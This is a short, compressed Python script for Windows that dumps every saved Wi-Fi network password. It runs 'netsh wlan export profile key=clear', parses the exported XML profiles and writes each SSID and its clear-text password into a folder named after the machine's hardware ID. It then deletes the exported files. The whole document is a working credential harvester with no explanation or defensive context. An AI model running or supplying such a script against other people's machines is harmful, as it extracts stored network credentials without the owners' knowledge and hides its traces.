_A=True
import os,subprocess,xml.etree.ElementTree as ET,uuid
def get_hw_id():A=uuid.getnode();return A
hwid=get_hw_id()
print(f"Hardware ID: {hwid}")
search_folder=os.path.join(os.path.expanduser('~'),'Documents',str(hwid))
output_folder=os.path.join(search_folder,'Wifi Passwords')
os.makedirs(output_folder,exist_ok=_A)
who_am_i=subprocess.run('whoami',capture_output=_A,shell=_A).stdout.decode().strip()
subprocess.run(['netsh','wlan','export','profile','key=clear'],capture_output=_A,shell=_A)
path=os.getcwd()
for f_name in os.listdir(path):
	if f_name.endswith('.xml'):
		f_name=os.path.join(path,f_name);tree=ET.parse(f_name);root=tree.getroot()
		try:
			ssid=root[0].text;password=root[4][0][1][2].text;print(f"SSID: {ssid}, Pass: {password}");file_name=f"{ssid}.txt";file_path=os.path.join(output_folder,file_name)
			with open(file_path,'w')as file:file.write(f"SSID: {ssid}\nPassword: {password}\n")
		except IndexError as e:print(f"{e} for SSID: {root[0].text}")
		os.remove(f_name)
		try:os.remove(os.path.join(path,'Wi-Fi-'))
		except FileNotFoundError:pass